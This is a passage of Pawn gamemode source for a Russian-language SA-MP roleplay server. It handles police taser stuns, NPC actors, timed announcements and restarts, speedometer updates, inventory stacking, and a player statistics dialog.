			if(PI[playerid][pSex] == 1) format(string, sizeof(string), "оглушил дубинкой %s", GetName(playerid));
			else format(string, sizeof(string), "оглушила дубинкой %s", GetName(playerid));
			MeAction(issuerid, string);
			ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 1, 1, 1, 0, 1);
			SetTimerEx("TazerOff", 15000, 0, "d", playerid);
			TogglePlayerControllable(playerid, 0);
			SetPVarInt(playerid, "Tazer", 1);
		}
	}
	if(weaponid == 23)
	{
		if(IsACop(issuerid))
		{
			if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(issuerid, C_RED, "Человек в машине!");
			if(GetPVarInt(playerid, "Tazer") > 0 || pCuff[playerid][pCuffee] == playerid) return SendClientMessage(issuerid, C_RED, "Игрок уже оглушен / в наручниках");

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s обездвижил Вас электрошокером на 15 секунд", GetName(issuerid));
			SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы обездвижили электрошокером %s на 15 секунд", GetName(playerid));
			SendClientMessage(issuerid, COLOR_BLUE, STRING_GLOBAL);

			new string[64];
			if(PI[playerid][pSex] == 1) format(string, sizeof(string), "обездвижил %s электрошокером", GetName(playerid));
			else format(string, sizeof(string), "обездвижила %s электрошокером", GetName(playerid));
			MeAction(issuerid, string);
			ApplyAnimation(playerid, "CRACK", "crckdeth2", 4.0, 0, 1, 1, 1, 0, 1);
			SetTimerEx("TazerOff", 15000, 0, "d", playerid);
			TogglePlayerControllable(playerid, 0);
			SetPVarInt(playerid, "Tazer", 1);
		}
	}
    return 1;
}

public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
    if(source) CallAntiCheat(playerid, "Click Crash", 85);
	return 1;
}

forward PlayerToggle(playerid, in_car);
public PlayerToggle(playerid, in_car)
{
	TogglePlayerControllable(playerid, 1);

	if(!in_car)
		ClearAnimations(playerid);

	if(GetPVarInt(playerid, "Tazer") > 0)
	{
		SetPVarInt(playerid, "Tazer", 0);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
		return 1;
	}
	return 1;
}

stock LoadActors()
{
	CreateActor(35, 1858.5012, 676.6824, 15.6640, 86.6101);
	CreateDynamic3DTextLabel("Персонаж\n\n{f6e58d}Охотник\n{cecece}(Нажмите ALT)", 0xcececeFF, 1858.5012, 676.6824, 15.6640, 5.0);

	CreateDynamic3DTextLabel("{ebc016}Данек\n{cecece}Аренда скутеров", 0xFFFFFFF, -482.0693,943.3712,13.2385, 15.0);
	scooter[0] = CreateActor(112, -482.0693,943.3712,12.1504,129.5661);
	CreateDynamic3DTextLabel("{ebc016}Вадик\n{cecece}Аренда скутеров", 0xFFFFFFF, -482.0551,879.1306,13.2385, 15.0);
	scooter[1] = CreateActor(175, -482.0551,879.1306,12.1504,39.4468);
	CreateDynamic3DTextLabel("{ebc016}Дэрил\n{cecece}Аренда скутеров", 0xFFFFFFF, 1899.1311,2073.4895,16.9169, 15.0);
	scooter[2] = CreateActor(175, 1899.1311,2073.4895,15.9169,268.3622);
	CreateDynamic3DTextLabel("{ebc016}Дик Рук\n{cecece}Аренда скутеров", 0xFFFFFFF, 2515.4492,-2132.8435,22.9700, 15.0);
	scooter[3] = CreateActor(174, 2515.4492,-2132.8435,21.9700,271.7559);

    CreateDynamic3DTextLabel("{FFFFFF}Женёк\n{e9c900}Квестовый персонаж", 0xFFFFFFF, -493.7800,921.3425,13.2385, 5.0);
	actors[0] = CreateActor(48, -493.7800,921.3425,12.1504,264.5505);
	ApplyActorAnimation(actors[0], "BD_FIRE", "M_SMKLEAN_LOOP", 4.1, 1, 1, 1, 1, 0);
    CreateDynamic3DTextLabel("{FFFFFF}Василий\n{e9c900}Начальник лесопилки", 0xFFFFFFF, 787.2955,500.0397,13.2385, 5.0);
	actors[1] = CreateActor(132, 787.2955,500.0397,12.0135,327.7850);
	CreateDynamic3DTextLabel("{ebc016}Баба Зина\n{cecece}Аренда скутеров", 0xFFFFFFF, 789.9755,520.3755,13.2385, 15.0);
	actors[2] = CreateActor(38,789.9755,520.3755,12.0084,31.6548);
	CreateDynamic3DTextLabel("{ebc016}Витёк\n{cecece}Главный Грузчик", 0xFFFFFFF, 879.9373,510.1894,13.2385, 15.0);
	actors[3] = CreateActor(202,879.9373,510.1894,11.9984,148.7274);
	CreateDynamic3DTextLabel("{ebc016}Анатолий\n{cecece}Начальник шахты", 0xFFFFFFF, 1528.7589,1441.1196,456.9969, 15.0);
	actors[4] = CreateActor(153,1528.7589,1441.1196,455.9069,183.4467);
	SetActorVirtualWorld(actors[4], 6);
	CreateDynamic3DTextLabel("{ebc016}Геннадий\n{cecece}Аренда скутеров", 0xFFFFFFF, 2317.6768,1729.5619,2.900, 15.0);
	actors[5] = CreateActor(84,2317.6768,1729.5619,1.8702,292.3194);
 	CreateDynamic3DTextLabel("{FFFFFF}Василий\n{e9c900}Продавец нелегала", 0xFFFFFFF, 2279.5237,-181.5237,2.999, 5.0);
	actors[6] = CreateActor(37, 2279.5237,-181.5237,2.1452,178.8136);
	ApplyActorAnimation(actors[6], "BD_FIRE", "M_SMKLEAN_LOOP", 4.1, 1, 1, 1, 1, 0);
	CreateDynamic3DTextLabel("{FFFFFF}Кирилл\n{e9c900}Продавец бумаги", 0xFFFFFFF, 822.3700,543.3995,13.2385, 5.0);
	actors[7] = CreateActor(128, 822.3700,543.3995,11.9692,114.2266);
	ApplyAnimation(actors[7],"BENCHPRESS","GYM_BP_CELEBRATE",4.1,1,1,0,0,1,1);
	actors[8] = CreateActor(128, 239.1515,2780.3728,12.9784,129.9192);
 	CreateDynamic3DTextLabel("{FFFFFF}Пётр\n{e9c900}Инструктор по вождению", 0xFFFFFFF, 1067.1842,112.3072,1050.7478, 5.0);
 	actors[9] = CreateActor(171, 1067.1842,112.3072,1049.7478,183.7967);
 	SetActorVirtualWorld(actors[9], 4);
 	CreateDynamic3DTextLabel("{FFFFFF}Василий Иванович\n{e9c900}Начальник стоянки", 0xFFFFFFF, -881.8564,1180.4720,11.5098, 5.0);
 	actors[10] = CreateActor(133, -881.8564,1180.4720,10.5098,10.5185);
 	ApplyActorAnimation(actors[10], "BD_FIRE", "M_SMKLEAN_LOOP", 4.1, 1, 1, 1, 1, 0);
 	CreateDynamic3DTextLabel("{FFFFFF}Григорий Мирославов\n{e9c900}Главный фермер", 0xFFFFFFF, -805.5324,-1225.3234,44.4454, 5.0);
 	actors[11] = CreateActor(133, -805.5324,-1225.3234,43.4254,235.6154);
 	ApplyActorAnimation(actors[11], "BD_FIRE", "M_SMKLEAN_LOOP", 4.1, 1, 1, 1, 1, 0);
}

forward MaskOff(playerid);
public MaskOff(playerid)
{
	new ok=0;
  	for(new s = 16; s > 0; s --)
  	{
   		if(PlayerItem1[playerid][s]==45){ok=s;break;}
   	}
	SetPlayerColorEx(playerid,TeamColors[GetTeamID(playerid)]);
	PlayerUseMask[playerid] = false;
	if(PlayerItem2[playerid][ok] == 0)
	{
		PlayerItem1[playerid][ok]=0;
	}
  	PlayerItem2[playerid][ok]--;
    SaveItem(playerid,ok);
	SetPlayerChatBubble(playerid, "снимает маску", COLOR_PURPLE, 13.0, 10000);
	GameTextForPlayer(playerid, "~y~INVISABLE OFF", 800, 4);
	PlayerPlaySound(playerid, 21001, 0.0, 0.0, 0.0);
	return 1;
}

forward Player_Control(playerid);
public Player_Control(playerid)
{
    if(PlayerLogged[playerid] == false)
	{
		SetPVarInt(playerid, "avttimer", GetPVarInt(playerid, "avttimer") - 1);
		if(GetPVarInt(playerid, "avttimer") == 0)
		{
			SendMess(playerid, MSG_LOGGED_TIME_OVER);
		    SKick(playerid, 21122);
			return 1;
		}
	}
    if(!PlayerLogged[playerid]) return 1;
   	if(MUSICACTIVE == true && activemusic[playerid] == false && IsPlayerInRangeOfPoint(playerid, MUSICDIST, MUSICX, MUSICY, MUSICZ))
    {
		if(PlayerMusic[playerid] == true)
		{
           PlayAudioStreamForPlayer(playerid, MUSICURL, MUSICX, MUSICY, MUSICZ,MUSICDIST, 1);
    	   activemusic[playerid] = true;
 		   SendClientMessage(playerid, C_BLUE, "Вы попали в зону проигрывания музыки.");
 		   SendClientMessage(playerid, C_BLUE, "Во избежании недоразумений, сделайте пожалуйста громкость колонок тише.");
 		   SendClientMessage(playerid, C_BLUE, "В песне, возможно, будет использована нецензурная брань.");
 		}
    }
    if(MUSICACTIVE == true && activemusic[playerid] == true && !IsPlayerInRangeOfPoint(playerid, MUSICDIST, MUSICX, MUSICY, MUSICZ))
    {
        if(PlayerMusic[playerid] == true)
		{
    	   activemusic[playerid] = false;
     	   StopAudioStreamForPlayer(playerid);
     	   SendClientMessage(playerid, C_BLUE, "Вы покинули зону прослушивания музыки!");
		}
    }
	return 1;
}

forward MinuteTimer();
public MinuteTimer()
{
	new hour, minute, sec, year, month, day;
	gettime(hour, minute, sec);
	getdate(year, month, day);

	if(minute % 20 == 1)
	{
		SendClientMessageToAll(0xffd83dFF, " ");

        SendClientMessageToAll(0xffd83dFF, "{37c268}Для открытия перснонального меню используйте {ffd83d}/mn");
		SendClientMessageToAll(0xffd83dFF, "{37c268}Хотите задать вопрос или отправить жалобу? Используйте {ffd83d}/report");
		SendClientMessageToAll(0xffd83dFF, "{37c268}Обо всех новостях Вы можете узнать в группе VK: {ffd83d}"SERVER_GROUP"");

		SendClientMessageToAll(0xffd83dFF, " ");
	}

	for(new i = 999; i > 0; i --)
	{
		if(DropItem[i][dTime] < gettime())
		{
			DropItem[i][dPiece]=0;
			DropItem[i][dX]=0;
			DropItem[i][dY]=0;
			DropItem[i][dZ]=0;
			DropItem[i][dIDItem]=0;
			DropItem[i][dPiece]=0;
			DestroyDynamicObject(DropItem[i][dObject]);
			DestroyDynamic3DTextLabel(DropItem[i][dText]);
			DropItem[i][dObject]=0;
		}
	}

/*	if(minute % 10 == 0)
	{
		SendClientMessageToAll(C_OSNOV, "[Strix INFORMATION] Уважаемые игроки! Работая на подработках, Вы можете получить кредиты");
		SendClientMessageToAll(C_OSNOV, "[Strix INFORMATION] На сервере действует акция на игровые привелегии! Подробнее: /bonus");
		SendClientMessageToAll(C_OSNOV, "[Strix INFORMATION] Наши контакты: vk.com/strix_rp / vk.com/cromulent_online");
	}*/

	if(hour == 0 || minute == 0)
	{
		g_ferm_info[F_PROFIT] =
		g_ferm_info[F_VISITORS] = 0;
	}

/*	static paintball_status = 0;
	if(minute == 59 && (hour % 2 == 0) && paintball_status == 0 && g_paintball_info[PB_STATUS] == 0)
	{
		SendClientMessageToAll(C_OSNOV, " Уважаемые игроки! Начало пейнтболла через 3 минуты!");
		SendClientMessageToAll(C_OSNOV, " Место проведения пейнтболла: /gps > 9 > 4");
		SendClientMessageToAll(C_OSNOV, " Команда победителей получит по 25000 рублей!");

		g_paintball_info[PB_STATUS] = 1;
		paintball_status = 1;
	}
	else if(minute == 2 && paintball_status == 0 && (hour % 2 == 1) && g_paintball_info[PB_STATUS] == 1)
	{
		g_paintball_info[PB_STATUS] = 2;

		new bool: team[2] = false;

		foreach(new playerid: Player)
		{
			if(PI[playerid][P_PB_TEAM] == 0) team[0] = true;
			if(PI[playerid][P_PB_TEAM] == 1) team[1] = true;
		}

		if(team[0] == false || team[1] == false)
			return StopPaintBall(0, -1);

		SendClientMessageToAll(C_OSNOV, " Уважаемые игроки! Матч по пейнтболлу начался!");

		if(g_paintball_info[PB_VOTE][0] > g_paintball_info[PB_VOTE][1])
		{
			g_paintball_info[PB_MAP] = 0;
		}
		else
		{
			g_paintball_info[PB_MAP] = 1;
		}

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, " Карта: %s", g_paintball_map_name[g_paintball_info[PB_MAP]]);
		SendClientMessageToAll(C_OSNOV, STRING_GLOBAL);

		StartPaintball();

		paintball_status = 1;
	}
	else if(minute != 2 && minute != 59)
	{
		paintball_status = 0;
	}*/

	WHDataUpdate();
	SaveWarehouse();
	new h,m,s;
	gettime(h,m,s);
	if(gCurMinutes != m)
	{
 		gCurMinutes = m;
 		if(gCurHour != h)
 		{
     		gCurHour = h;
     		if(h == 5 && m == 1)
			{
				SendClientMessageToAll(C_RED, "Через две минуты произойдет автоматическая перезагрузка сервера.");
				SendClientMessageToAll(C_RED, "Закончите пожалуйста все свои работы! Вы будете отключены с сервера.");
			}
       	}
 		else if(h == 6 && m == 3 && s == 00) // - Рестарт по времени
 		{
			GameTextForAll( "~b~RESTART", 5000, 3);
			SendClientMessageToAll(C_RED, "Уважаемые игроки, происходит автоматическая перезагрузка сервера...");
			SaveWarehouse();
			foreach(new i: Player)
			{
			    if(!PlayerLogged[i]) continue;
				Kick(i);
			}
			SetTimer("GameModeExitDelay", 5000, false);
 		}
	}

	return 1;
}

forward SecTimer();
public SecTimer()
{
 	new h,m,s;
	gettime(h,m,s);
   	if(m == 2 && PAYDAY == 1) PAYDAY = 0;
	if(m == 1 && PAYDAY == 0)
	{
		PAYDAY = 1;
		SetWorldTime(h);
		PayDay();
	}

	static rescar_ad_status = 0;
	if( (m == 29 || m == 59) && rescar_ad_status == 0)
	{
		SendClientMessageToAll(0xFFCC00FF, "Уважаемые игроки, через 15 секунд произойдет респавн транспорта. Пожалуйста, займите водительское место своего транспорта!");
		rescar_ad_status = 1;
	}
	else if(m != 29 && m != 59)
	{
		rescar_ad_status = 0;
	}

	static rescar_status = 0;
	if( (m == 30 || m == 0) && rescar_status == 0)
	{
		foreach(new i: Vehicle)
		{
			if(GetVehicleData(i, veh_driver_id) != INVALID_PLAYER_ID)
				continue;

			if(g_vehicle[i][veh_autosalon] == true)
				continue;

			if(gVehicleGun[i][vGunLoading] == true)
				continue;

			SetVehiclePos(i, g_vehicle[i][veh_x], g_vehicle[i][veh_y], g_vehicle[i][veh_z]);
			SetVehicleZAngle(i, g_vehicle[i][veh_a]);
			SetVehicleHealth(i, 1000.0);
		}
		rescar_status = 1;
	}
	else if(m != 30 && m != 0)
	{
		rescar_status = 0;
	}

	if(g_capture[C_STATUS] && g_capture[C_TIME] > 0)
	{
		g_capture[C_TIME] --;

		UpdateCaptureTd();

		if(g_capture[C_TIME] <= 0)
			EndCapture();
	}

	return 1;
}

forward UpdateSpeedometr(playerid);
public UpdateSpeedometr(playerid)
{
	if(PI[playerid][pAFK] >= 3 && GetPlayerState(playerid) != 2 || GetPVarInt(playerid, "rating_status") || GetPVarInt(playerid, "tuning")) return 1;

	new vehicleid = GetPlayerVehicleID(playerid);

	if(IsAPlane(vehicleid) == 1 || IsABoat(vehicleid) == 1 || IsAMoped(vehicleid) == 1 || IsAVel(vehicleid) == 1) return 1;

	new speed = SpeedVehicle(playerid);
	new Float:health;

	GetVehicleHealth(vehicleid, health);

    g_vehicle[vehicleid][veh_milliage] += float(speed) / 150000.0; // ## 3600.0

	STRING_GLOBAL[0] = EOS;

	/*format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%06i", floatround(GetVehicleData(vehicleid, veh_milliage)));
	PlayerTextDrawSetString(playerid, mod_speedo_ptd[8][playerid], STRING_GLOBAL);*/

    new millage = floatround(GetVehicleData(vehicleid, veh_milliage));
    SendSpeedometerData(playerid, MILEAGE, millage);

	new fuel = GetVehicleData(vehicleid, veh_fuel);
	SendSpeedometerData(playerid, GAS, fuel);

	if(GetVehicleData(vehicleid, veh_engine) != false)
	{
        SendSpeedometerData(playerid, ENGINE, 1);
	}

	else
	{
		SendSpeedometerData(playerid, ENGINE, 0);
	}

	if(GetPVarInt(playerid, "Boot") == 0)
	{
		SendSpeedometerData(playerid, TRUNK, 0);
	}
	else if(GetPVarInt(playerid, "Boot") == 1)
	{
		SendSpeedometerData(playerid, TRUNK, 1);
	}

	if(GetVehicleData(vehicleid, veh_lights) != false)
	{
		SendSpeedometerData(playerid, LIGHTS, 1);
	}

	else
	{
		SendSpeedometerData(playerid, LIGHTS, 0);
	}

	if(GetVehicleData(vehicleid, veh_locked) != false)
	{
		SendSpeedometerData(playerid, DOORS, 1);
	}

	else
	{
		SendSpeedometerData(playerid, DOORS, 0);
	}
	return 1;
}

forward UpdateSpeedometrCopter(playerid);
public UpdateSpeedometrCopter(playerid)
{
	if(PI[playerid][pAFK] >= 3 && GetPlayerState(playerid) != 2) return 1;
	new vehicleid = GetPlayerVehicleID(playerid);

	new speed = SpeedVehicle(playerid)/2;

	new Float: X, Float: Y, Float: Z;

	GetVehiclePos(vehicleid, X, Y, Z);

	new fmt_text[90];

	format(fmt_text, sizeof fmt_text, "скорость: %d км/ч~n~высота: %4.1f м", speed, Z);
	PlayerTextDrawSetString(playerid, copter_speed[3][playerid], fmt_text);

	/*format(fmt_text, sizeof fmt_text, "%s", GetCarName(GetVehicleModel(vehicleid)));
	PlayerTextDrawSetString(playerid, copter_speed[2][playerid], fmt_text);*/

	if(GetVehicleData(vehicleid, veh_engine) == false)
	{
	    PlayerTextDrawColor(playerid, copter_speed[5][playerid], 0xFA1818FF);
	    PlayerTextDrawShow(playerid, copter_speed[5][playerid]);
	}
	else
	{
	    PlayerTextDrawColor(playerid, copter_speed[5][playerid], 0x1CAD0FFF);
	    PlayerTextDrawShow(playerid, copter_speed[5][playerid]);
	}

	if(GetVehicleData(vehicleid, veh_locked) == true)
	{
	    PlayerTextDrawColor(playerid, copter_speed[6][playerid], 0xE3C722FF);
	    PlayerTextDrawShow(playerid, copter_speed[6][playerid]);
	}
	else
	{
	    PlayerTextDrawColor(playerid, copter_speed[6][playerid], 0xFA1818FF);
	    PlayerTextDrawShow(playerid, copter_speed[6][playerid]);
	}

	return 1;
}

stock FindFreeSlot(playerid) {
    new maxUsedSlot = 50 + PI[playerid][P_UNLOCK_LEVEL] * 5;
	for (new i = 0; i < maxUsedSlot; i++)
	{
		if (SlotIsEmpty(playerid, i) == 1)
		return i;
	}
	return -1;
}

stock FindIncompleteItemSlot(playerid, item) {
    new maxUsedSlot = 50 + PI[playerid][P_UNLOCK_LEVEL] * 5;
	for (new i = 0; i < maxUsedSlot; i++) {
		if (PlayerInventory[playerid][i][ItemIconIndex] != item)
			continue;

        new maxInStack = GetMaxCountInStack(item);
        new total = PlayerInventory[playerid][i][ItemCount];
        /*format(str, sizeof(str), "FindIncompleteItemSlot() slot(%d) total(%d) maxInStack(%d)", i, total, maxInStack);
		SendClientMessage(playerid, -1, str);*/
        if (total < maxInStack)
			return i;
	}
	return -1;
}

stock GiveItem(playerid, item, count) {
	if (item == 0)
		return;

    new maxInStack = GetMaxCountInStack(item);
    new freeSlot = -1;
    if (maxInStack == 1) {
        freeSlot = FindFreeSlot(playerid);
		while (freeSlot > -1 && count > 0) {
		    PlayerInventory[playerid][freeSlot][ItemIconIndex] = item;
			PlayerInventory[playerid][freeSlot][ItemCount] = 1;
			count -= 1;
			freeSlot = FindFreeSlot(playerid);
			SaveItem(playerid,freeSlot);
		}
	}
	else {
		new incompleteSlot = FindIncompleteItemSlot(playerid, item);
		while (incompleteSlot > -1 && count > 0) {
			new wantage = maxInStack - PlayerInventory[playerid][incompleteSlot][ItemCount];
			if (wantage <= count) {
				count -= wantage;
			    PlayerInventory[playerid][incompleteSlot][ItemCount] += wantage;
			    incompleteSlot = FindIncompleteItemSlot(playerid, item);
			    SaveItem(playerid,incompleteSlot);
			}
			else {
			    PlayerInventory[playerid][incompleteSlot][ItemCount] += count;
				count = 0;
				SaveItem(playerid,incompleteSlot);
			}
		}

		if (incompleteSlot == -1 && count > 0) {
		    freeSlot = FindFreeSlot(playerid);
			while (freeSlot > -1 && count > 0) {
				if (count <= maxInStack) {

				    PlayerInventory[playerid][freeSlot][ItemIconIndex] = item;
                    PlayerInventory[playerid][freeSlot][ItemCount] = count;
                    count = 0;
                    SaveItem(playerid,freeSlot);
				}
				else {

				    PlayerInventory[playerid][freeSlot][ItemIconIndex] = item;
					PlayerInventory[playerid][freeSlot][ItemCount] = maxInStack;
					count -= maxInStack;
                    freeSlot = FindFreeSlot(playerid);
                    SaveItem(playerid,freeSlot);
				}
			}
		}
	}

	if (freeSlot == -1 && count > 0) {
		SendClientMessage(playerid, -1, "Инвентарь заполнился, сохраняю во временный буффер");
	}
}

stock SendInventoryChanges(playerid, target, source = -1)
{
    new BitStream:bs = BS_New();
	BS_WriteValue(bs, PR_UINT8, PI[playerid][P_UNLOCK_LEVEL]);

    BS_WriteValue(bs, PR_UINT8, target);
    BS_WriteValue(bs, PR_UINT8, PlayerInventory[playerid][target][ItemIconIndex]);
    BS_WriteValue(bs, PR_INT32, PlayerInventory[playerid][target][ItemCount]);

	if (source != -1) {
	    BS_WriteValue(bs, PR_UINT8, source);
	    BS_WriteValue(bs, PR_UINT8, PlayerInventory[playerid][source][ItemIconIndex]);
	    BS_WriteValue(bs, PR_INT32, PlayerInventory[playerid][source][ItemCount]);
    }
	PR_SendRPC(bs, playerid, 210);
    BS_Delete(bs);
}

stock CloseInventory(playerid) {
    new BitStream:bs = BS_New();
    PR_SendRPC(bs, playerid, 210);
    BS_Delete(bs);
}

stock SwapItems(playerid, target, source) {
    new str[255];
	if (PlayerInventory[playerid][target][ItemIconIndex] == PlayerInventory[playerid][source][ItemIconIndex]) {
	    new total = PlayerInventory[playerid][target][ItemCount] + PlayerInventory[playerid][source][ItemCount];
	    format(str, sizeof(str), "equale items total(%d)", total);
		SendClientMessage(playerid, -1, str);
	    new maxInStack = GetMaxCountInStack(PlayerInventory[playerid][target][ItemIconIndex]);
	    if (total <= maxInStack) {
		    PlayerInventory[playerid][target][ItemCount] = total;
		    ClearSlot(playerid, source);
			SaveItem(playerid, target);
		}
		else {
            PlayerInventory[playerid][target][ItemCount] = maxInStack;
            PlayerInventory[playerid][source][ItemCount] = total - maxInStack;

			SaveItem(playerid, target);
			SaveItem(playerid, source);
		}
 }
	else {
	    if (SlotIsEmpty(playerid, target)) {
	        PlayerInventory[playerid][target][ItemIconIndex] = PlayerInventory[playerid][source][ItemIconIndex];
			PlayerInventory[playerid][target][ItemCount] = PlayerInventory[playerid][source][ItemCount];

			ClearSlot(playerid, source);

			SaveItem(playerid, source);
	    }
	    else if (SlotIsEmpty(playerid, source)) {
	    	PlayerInventory[playerid][source][ItemIconIndex] = PlayerInventory[playerid][target][ItemIconIndex];
			PlayerInventory[playerid][source][ItemCount] = PlayerInventory[playerid][target][ItemCount];

			ClearSlot(playerid, target);

			SaveItem(playerid, target);
	    }
	    else {
			new item = PlayerInventory[playerid][target][ItemIconIndex];
			new count = PlayerInventory[playerid][target][ItemCount];

			PlayerInventory[playerid][target][ItemIconIndex] = PlayerInventory[playerid][source][ItemIconIndex];
			PlayerInventory[playerid][target][ItemCount] = PlayerInventory[playerid][source][ItemCount];

			PlayerInventory[playerid][source][ItemIconIndex] = item;
			PlayerInventory[playerid][source][ItemCount] = count;
		}
		SaveItem(playerid, target);
		SaveItem(playerid, source);
	}
	SendInventoryChanges(playerid, target, source);
	//ShowInventory(playerid);
}

stock GetMaxCountInStack(item) {
	switch (item) {
		case 1..17, 37, 29,36:
		return 5;

		case 20..26, 28, 30..34:
		return 1;

		case 27:
		return 60;

		case 40:
		return 40;

		case 333, 334:
		return 3;

		case 363:
		return 20;

	}
	return 0;
}

stock SlotIsEmpty(playerid, slot) {
	return (PlayerInventory[playerid][slot][ItemIconIndex] == 0);
}

stock IsVehicleDrivingBackwards(vehicleid)
{
	new Float:Float[3];
	if(GetVehicleVelocity(vehicleid, Float[1], Float[2], Float[0]))
    {
		GetVehicleZAngle(vehicleid, Float[0]);
		if(Float[0] < 90)
		{
			if(Float[1] > 0 && Float[2] < 0) return true;
	    }
		else if(Float[0] < 180)
	    {
			if(Float[1] > 0 && Float[2] > 0) return true;
		}
		else if(Float[0] < 270)
		{
			if(Float[1] < 0 && Float[2] > 0) return true;
		}
		else if(Float[1] < 0 && Float[2] < 0) return true;
	}
	return false;
}

stock ShowPlayerStatsDialog(playerid, targetid)
{
	new status_text[20], married_text[MAX_PLAYER_NAME], wanted_text[32], phone_text[20], year, month, day;
	getdate(year, month, day);
	if(PI[targetid][pMarried] == 0) format(married_text, sizeof(married_text), "Нет");
	else format(married_text, sizeof(married_text), "%s", PI[targetid][pWhoMarried]);
	if(PI[targetid][pWanted] == 0) format(wanted_text, sizeof(wanted_text), "Нет");
	else format(wanted_text, sizeof(wanted_text), "%s", PI[targetid][pWantedReason]);
	if(PI[targetid][pPhoneNumber] <= 1) format(phone_text, sizeof(phone_text), "Не имеется");
	else format(phone_text, sizeof(phone_text), "%i", PI[targetid][pPhoneNumber]);
	if(PI[targetid][pAdmin]) status_text = "Администратор";
	else if(PI[targetid][pVip]) status_text = "VIP";
	else status_text = "Игрок";
	new sctring[1400], str[250];
	format(str,sizeof(str),"{ffffff}Имя:\t\t\t\t{0099FF}%s\n",GetName(targetid));
	strcat(sctring,str);
	format(str,sizeof(str),"{FFFFFF}Уровень:\t\t\t{FFAA44}%d\n",PI[targetid][pLevel]);
	strcat(sctring,str);
	format(str,sizeof(str),"{FFFFFF}Опыт:\t\t\t\t{FFAA44}%d / %d\n",PI[targetid][pExp], (PI[targetid][pLevel]+1)*2);
	strcat(sctring,str);
	format(str,sizeof(str),"{FFFFFF}Возраст:\t\t\t%d\n",PI[targetid][pAge]);
	strcat(sctring,str);
	format(str,sizeof(str),"Предупреждения:\t\t%d / 3\n",PI[targetid][pWarn]);
	strcat(sctring,str);
	format(str,sizeof(str), "{FFFFFF}Отыграно:\t\t\t%s\n", Converts(PI[targetid][pCheckTime]));
	strcat(sctring,str);
	if(PI[playerid][pSex] == 1) format(str,sizeof(str),"Служил:\t\t\t%s\n",(PI[targetid][pVoennik])?("Да"):("Нет"));
	else format(str,sizeof(str),"Служила:\t\t\t%s\n",(PI[targetid][pVoennik])?("Да"):("Нет"));
	strcat(sctring,str);
	format(str,sizeof(str),"Законопослушность:\t\t%d\n",PI[targetid][pZakon]);
	strcat(sctring,str);
	format(str,sizeof(str),"Наличные:\t\t\t%iр\n",GetMoney(targetid));
	strcat(sctring,str);
	format(str,sizeof(str),"Банк:\t\t\t\t%iр\n",PI[targetid][pBank]);
	strcat(sctring,str);
	format(str,sizeof(str),"Розыск:\t\t\t%i\n",PI[targetid][pWanted]);
	strcat(sctring,str);
	format(str,sizeof(str),"Номер телефона:\t\t%s\n",phone_text);
	strcat(sctring,str);
	if(PI[targetid][pSex] == 1) format(str,sizeof(str),"Женат на:\t\t\t%s\n",married_text);
	else format(str,sizeof(str),"Замужем за:\t\t\t%s\n",married_text);
	strcat(sctring,str);
	format(str,sizeof(str),"Пол:\t\t\t\t%s\n",(PI[targetid][pSex]==1)?("Мужчина"):("Женщина"));
	strcat(sctring,str);
	format(str,sizeof(str),"Работа:\t\t\t\t%s\n",Job_Names[PI[targetid][pJob]]);
	strcat(sctring,str);
	if(PI[targetid][pMember] != 0) format(str,sizeof(str),"Организация:\t\t\t{63BD4E}%s{FFFFFF}\n",Fraction_Name[PI[targetid][pMember]]);
	else format(str,sizeof(str),"Организация:\t\t\tНет\n");
	strcat(sctring,str);
	if(PI[targetid][pRank] != 0) format(str,sizeof(str),"Должность:\t\t\t{63BD4E}%s (%i){FFFFFF}\n",Fraction_Rang[PI[targetid][pMember]][PI[targetid][pRank]],PI[targetid][pRank]);
	else format(str,sizeof(str),"Должность:\t\t\tНет\n");
	strcat(sctring,str);
	if(PI[targetid][pMember] != 0 && PI[targetid][pLeader] == 0)
	{
		format(str, sizeof str, "Выговоров:\t\t\t{FFFFFF}%d/{FF0000}3{FFFFFF}\n\n", PI[targetid][pFracWarn]);
		strcat(sctring, str);
	}
	if(GetPlayerBizz(targetid) == 0) strcat(sctring,"Бизнес:\t\t\tНет\n");
	else
	{
	    new number_bizz = 0;
	    for(new i = TOTALBIZZ; i > 0; i --)
	    {
	        if(!strcmp(BizzInfo[i][bOwner],GetName(targetid),true)) number_bizz = i;
	    }
	    format(str,sizeof(str),"Бизнеc:\t\t\t%s (%i)\n",BizzInfo[number_bizz][bName],number_bizz);
		strcat(sctring,str);
	}
	if(GetPlayerHouse(targetid) == 0) strcat(sctring,"Дом:\t\t\t\tНет\n");
	else
	{
	    new number_house = 0;
	    for(new i = TOTALHOUSE; i > 0; i --)
		{
		    if(!strcmp(HouseInfo[i][hOwner],GetName(targetid),true)) number_house = i;
		}
		format(str,sizeof(str),"Дом:\t\t\t\t№%i\n",number_house);
		strcat(sctring,str);
	}
	format(str,sizeof(str),"Кредитов:\t\t\t%d\n",PI[targetid][pCredits]);
	strcat(sctring,str);
	format(str,sizeof(str),"Номер аккаунта:\t\t%d\n",PI[targetid][pID]);
	strcat(sctring,str);
	format(str,sizeof(str),"Статус:\t\t\t\t%s\n",status_text);
	strcat(sctring,str);
	format(str,sizeof(str),"Дата:\t\t\t\t%d.%d.%04dг.",day, month, year);
	strcat(sctring,str);
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Статистика персонажа", sctring, "Закрыть", "");
	return 1;
}

stock LesorubRange(playerid)
{
	ApplyAnimation(playerid, "CHAINSAW", "weapon_csaw", 4.0, 0, 0, 0, 0, 0);
    new animlib[30], animname[30];
	if(GetString(animlib[playerid], "CHAINSAW") && GetString(animname[playerid], "weapon_csaw"))
	{
		SetPVarInt(playerid, "LessProgress", GetPVarInt(playerid, "LessProgress") + 5);
	}
}

forward AntiBH(playerid);
public AntiBH(playerid)
{
	if(times[playerid] == false)
	{
		ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,0,0,0);
		times[playerid] = true;
	}
	return 1;
}
public OnGameModeInit()
{
	cef_subscribe("awesome:client:event", "OnCefClientEvent");
	//Profiler_Dump();
    gamemodeloaded = 0;
